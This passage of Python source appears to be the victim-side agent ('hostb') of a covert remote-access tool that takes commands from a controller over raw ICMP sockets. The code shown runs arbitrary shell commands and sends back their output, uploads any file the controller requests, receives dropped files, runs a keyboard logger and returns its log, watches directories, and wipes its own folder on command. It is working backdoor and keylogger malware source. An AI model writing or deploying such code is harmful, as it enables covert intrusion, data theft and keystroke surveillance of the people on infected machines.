                recv_socket, send_socket, ctx.connected_to, source_ip, ctx.key,
                chunk_index, expected_packets, chunks_written,
                CHUNK_RECV_TIMEOUT_SECONDS,
            )
            if chunk_bytes is None:
                print(f"[FILE] chunk {chunk_index} receive failed "
                      f"(missing {missing}/{expected_packets} packets); aborting")
                file_handle.close()
                file_handle = None
                try:
                    os.remove(output_path)
                except OSError:
                    pass
                output_path = None
                return

            file_handle.write(chunk_bytes[:chunk_byte_count])
            chunks_written.add(chunk_index)
            try:
                send_ack(send_socket, source_ip, ctx.connected_to, ctx.key,
                         ACK_CHUNK, sequence=chunk_index)
            except OSError as exc:
                ctx.error_message = f"failed to send chunk ack: {exc}"
                ctx.error_code = 2
                handle_error(ctx)
            print(f"[FILE] chunk {chunk_index + 1}/{total_chunks} written and acked "
                  f"({chunk_byte_count} bytes)")

        # Phase D: drain window for END marker and stray retransmits.
        drain_for_end(recv_socket, send_socket, ctx.connected_to, source_ip,
                      ctx.key, chunks_written, END_DRAIN_TIMEOUT_SECONDS)

        file_handle.close()
        file_handle = None
        print(f"[FILE] received {output_path} ({file_size} bytes)")
    finally:
        if file_handle is not None:
            file_handle.close()
        recv_socket.close()
        send_socket.close()


def send_file(ctx: Context):
    """Handle CMD_REQUEST_FILE: receive the requested path, read the file,
    stream the bytes back via the chunked protocol. An empty stream signals
    'not found / unreadable' to hosta."""
    if not ctx.connected_to:
        return

    source_ip = detect_source_ip(ctx.connected_to)

    try:
        recv_socket = open_raw_icmp_recv_socket()
        send_socket = open_raw_send_socket()
    except PermissionError:
        ctx.error_message = "permission denied (raw sockets require sudo)"
        handle_error(ctx)

    try:
        # Phase A: signal ready to receive the path.
        try:
            send_ack(send_socket, source_ip, ctx.connected_to, ctx.key, ACK_READY)
        except OSError as exc:
            ctx.error_message = f"failed to send ack_ready: {exc}"
            ctx.error_code = 2
            handle_error(ctx)
        print(f"[ACK_READY] sent to {ctx.connected_to}")

        # Phase B: receive the requested path.
        path_bytes = receive_byte_stream_chunked(
            recv_socket, send_socket, source_ip, ctx.connected_to,
            ctx.key, METADATA_TIMEOUT_SECONDS,
        )
        if path_bytes is None:
            print("[SEND] path receive failed; aborting")
            return
        try:
            requested_path = path_bytes.decode("utf-8")
        except UnicodeDecodeError:
            requested_path = path_bytes.decode("utf-8", errors="replace")
        print(f"[SEND] hosta requested: {requested_path!r}")

        # Phase C: read the file. Empty payload signals failure to hosta.
        try:
            with open(requested_path, "rb") as f:
                file_bytes = f.read()
        except (FileNotFoundError, IsADirectoryError, PermissionError) as exc:
            print(f"[SEND] cannot read {requested_path}: {exc}")
            file_bytes = b""
        except OSError as exc:
            print(f"[SEND] cannot read {requested_path}: {exc}")
            file_bytes = b""

        if len(file_bytes) > MAX_OUTBOUND_FILE_BYTES:
            print(f"[SEND] file too large ({len(file_bytes)} bytes); aborting")
            file_bytes = b""

        if file_bytes:
            print(f"[SEND] sending {len(file_bytes)} bytes")
        else:
            print("[SEND] sending empty stream to signal failure")

        if not send_byte_stream_chunked(send_socket, recv_socket, source_ip,
                                        ctx.connected_to, ctx.key, file_bytes):
            print("[SEND] file send failed")
            return
        print("[SEND] file sent")
    finally:
        recv_socket.close()
        send_socket.close()


def run_bg(ctx: Context):
    """CMD_RUN_BG: Send device list, receive choice, start logger"""
    if not ctx.connected_to:
        return
    source_ip = detect_source_ip(ctx.connected_to)

    try:
        recv_socket = open_raw_icmp_recv_socket()
        send_socket = open_raw_send_socket()
    except PermissionError:
        ctx.error_message = "permission denied (raw sockets require sudo)"
        handle_error(ctx)
        return

    try:
        from hotkeys import list_devices_for_remote, start_logger

        device_list_text, devices = list_devices_for_remote()
        print(f"[BG] Sending {len(devices)} keyboard options to hosta...")

        send_ack(send_socket, source_ip, ctx.connected_to, ctx.key, ACK_READY)

        if not send_byte_stream_chunked(send_socket, recv_socket, source_ip,
                                        ctx.connected_to, ctx.key,
                                        device_list_text.encode("utf-8")):
            print("[BG] Failed to send device list")
            return

        print("[BG] Waiting for device selection...")

        choice_bytes = receive_byte_stream_chunked(
            recv_socket, send_socket, source_ip, ctx.connected_to,
            ctx.key, METADATA_TIMEOUT_SECONDS
        )
        if choice_bytes is None:
            print("[BG] Choice receive failed")
            return

        try:
            choice = int(choice_bytes.decode("utf-8").strip())
            if 0 <= choice < len(devices):
                from hotkeys import logger_device
                logger_device = devices[choice]
                print(f"[BG] Selected: {logger_device.path}")
                start_logger("hotkey.log")
            else:
                print(f"[BG] Invalid choice {choice}")
        except Exception as e:
            print(f"[BG] Choice error: {e}")

    finally:
        recv_socket.close()
        send_socket.close()


def stop_bg(ctx: Context):
    """CMD_STOP_BG: Stop logger + send log back using same protocol"""
    if not ctx.connected_to:
        return

    from hotkeys import stop_logger, get_hotkey_log_content
    print("Stopping background logger...")
    stop_logger()

    source_ip = detect_source_ip(ctx.connected_to)
    try:
        recv_socket = open_raw_icmp_recv_socket()
        send_socket = open_raw_send_socket()
    except PermissionError:
        ctx.error_message = "permission denied (raw sockets require sudo)"
        handle_error(ctx)
        return

    try:
        send_ack(send_socket, source_ip, ctx.connected_to, ctx.key, ACK_READY)

        log_content = get_hotkey_log_content("hotkey.log")
        print(f"[BG] Sending log ({len(log_content)} bytes)...")

        if send_byte_stream_chunked(send_socket, recv_socket, source_ip,
                                    ctx.connected_to, ctx.key,
                                    log_content.encode("utf-8")):
            print("[BG] Log sent successfully")
        else:
            print("[BG] Log send failed")
    finally:
        recv_socket.close()
        send_socket.close()


def uninstall(ctx: Context):
    cwd = os.getcwd()
    print(f"[UNINSTALL] wiping {cwd}")

    removed = 0
    failed = 0
    for entry in os.listdir(cwd):
        entry_path = os.path.join(cwd, entry)
        try:
            if os.path.islink(entry_path) or not os.path.isdir(entry_path):
                os.remove(entry_path)
            else:
                shutil.rmtree(entry_path)
            print(f"  removed {entry}")
            removed += 1
        except OSError as exc:
            print(f"  failed to remove {entry}: {exc}")
            failed += 1

    print(f"[UNINSTALL] done; removed={removed} failed={failed}; shutting down")
    ctx.connected = False
    ctx.connected_to = None
    ctx.stop_requested.set()


def run_program(ctx: Context):
    if not ctx.connected_to:
        return

    source_ip = detect_source_ip(ctx.connected_to)

    # Open raw recv socket (fat buffer) BEFORE sending ACK_READY so we don't
    # miss the first command-metadata packets.
    try:
        recv_socket = open_raw_icmp_recv_socket()
        send_socket = open_raw_send_socket()
    except PermissionError:
        ctx.error_message = "permission denied (raw sockets require sudo)"
        handle_error(ctx)

    try:
        try:
            send_ack(send_socket, source_ip, ctx.connected_to, ctx.key, ACK_READY)
        except OSError as exc:
            ctx.error_message = f"failed to send ack_ready: {exc}"
            ctx.error_code = 2
            handle_error(ctx)
        print(f"[ACK_READY] sent to {ctx.connected_to}")

        command_bytes = receive_byte_stream_chunked(
            recv_socket, send_socket, source_ip, ctx.connected_to,
            ctx.key, METADATA_TIMEOUT_SECONDS,
        )
        if command_bytes is None:
            print("[RUN] command receive failed; aborting")
            return

        try:
            command_text = command_bytes.decode("utf-8")
        except UnicodeDecodeError:
            command_text = command_bytes.decode("utf-8", errors="replace")
        print(f"[RUN] executing: {command_text!r}")

        try:
            result = subprocess.run(
                command_text,
                shell=True,
                capture_output=True,
                timeout=SUBPROCESS_TIMEOUT_SECONDS,
            )
            output = result.stdout + result.stderr
            if result.returncode != 0:
                output += f"\n[exit code: {result.returncode}]".encode("utf-8")
        except subprocess.TimeoutExpired:
            output = f"[command timed out after {SUBPROCESS_TIMEOUT_SECONDS}s]".encode("utf-8")
        except Exception as exc:
            output = f"[execution error: {exc}]".encode("utf-8")

        if len(output) > MAX_OUTPUT_BYTES:
            truncation_notice = b"\n[output truncated]"
            output = output[:MAX_OUTPUT_BYTES - len(truncation_notice)] + truncation_notice
            print(f"[RUN] output truncated to {MAX_OUTPUT_BYTES} bytes")

        print(f"[RUN] sending output back ({len(output)} bytes)")
        if not send_byte_stream_chunked(send_socket, recv_socket, source_ip,
                                        ctx.connected_to, ctx.key, output):
            print("[RUN] output send failed")
            return

        print("[RUN] output sent")
    finally:
        recv_socket.close()
        send_socket.close()


if __name__ == "__main__":
    print("--------------- HOSTB ---------------")
    ctx = Context()
    parse_arguments(ctx)
    handle_arguments(ctx)

    print(f"Interface: {ctx.iface or 'default'}")

    while not ctx.stop_requested.is_set():
        print("\nWaiting for session...")
        wait_for_session(ctx)
        if ctx.connected_to is None:
            break
        print("\nEstablishing session...")
        establish_session(ctx)

        while ctx.connected and not ctx.stop_requested.is_set():
            print("\nListening for commands...")
            command_code = listen_for_command(ctx)
            if command_code is None:
                break
            if command_code == CMD_DISCONNECT:
                print(f"[DISCONNECTED] {ctx.connected_to}")
                ctx.connected = False
                ctx.connected_to = None
                break
            elif command_code == CMD_TRANSFER_FILE:
                print("\nReceiving file...")
                receive_file(ctx)
            elif command_code == CMD_UNINSTALL:
                print("\nUninstalling...")
                uninstall(ctx)
                break
            elif command_code == CMD_RUN_PROGRAM:
                print("\nRunning program...")
                run_program(ctx)
            elif command_code == CMD_REQUEST_FILE:
                print("\nSending requested file...")
                send_file(ctx)
            elif command_code == CMD_WATCH_FILE:
                print("\nStarting file watch...")
                _watch_and_stream(ctx, recursive=False)
            elif command_code == CMD_WATCH_DIR:
                print("\nStarting directory watch...")
                _watch_and_stream(ctx, recursive=True)
            elif command_code == CMD_RUN_BG:
                print("\nStarting background function...")
                run_bg(ctx)
            elif command_code == CMD_STOP_BG:
                print("\nStopping background function...")
                stop_bg(ctx)
            else:
                print(f"Ignoring unknown command code {command_code}.")

    print("\nShutting down.")
